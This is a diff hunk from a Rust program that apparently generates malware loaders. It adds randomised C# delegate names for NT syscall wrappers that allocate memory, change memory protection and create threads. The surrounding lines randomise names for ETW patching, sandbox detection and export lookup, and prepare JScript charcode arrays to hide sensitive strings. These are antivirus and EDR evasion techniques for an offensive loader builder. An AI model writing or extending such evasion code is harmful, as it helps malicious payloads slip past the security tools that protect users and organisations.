@@ -250,6 +250,10 @@ fn build_context(config: &LoaderConfig) -> Context {
     for k in &["fn_etw", "fn_etw_patch", "fn_sandbox", "fn_build_str", "fn_getexport"] {
         vars.insert(k, rand_ident(10));
     }
+    // C# delegate variable names for NT syscall wrappers (must not be static strings)
+    for k in &["fn_nt_alloc", "fn_nt_prot", "fn_nt_thread"] {
+        vars.insert(k, rand_ident(10));
+    }
 
     // JScript charcode arrays (comma-separated integers) for sensitive strings
     let jsc_pairs: &[(&str, &str)] = &[
